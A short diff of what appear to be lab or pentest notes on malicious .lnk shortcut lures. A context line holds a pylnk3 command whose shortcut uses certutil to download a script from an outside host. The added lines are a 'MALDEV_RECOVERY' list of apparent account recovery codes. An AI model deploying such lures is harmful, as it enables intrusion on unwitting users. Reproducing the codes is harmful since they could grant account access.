@@ -43,3 +43,17 @@ We can craft our lnk files , So if some users being curious enough to **click** 
 ```
 └─# pylnk3 create C:/Windows/System32/cmd.exe -a "/c certutil.exe -f -split -urlcache http://10.8.0.148/hashgrab.py & " check.lnk
 ```
+
+
+
+
+### MALDEV_RECOVERY
+
+Z5Uc52TuPv-cLzZcqILEF
+1c2fCn2MsM-Ulq4zvzf8p
+xpSHNrEgPf-phlYNPWe7w
+GHJlnbVMeP-MCl5whj6Kb
+03GMwdBPY4-YZrxhfhMR2
+hnHJuedEoM-GO8UOxeW7X
+2LafkWtvWj-g3yvflAjEZ
+nUeS3suGSz-MIMsuJXZdg
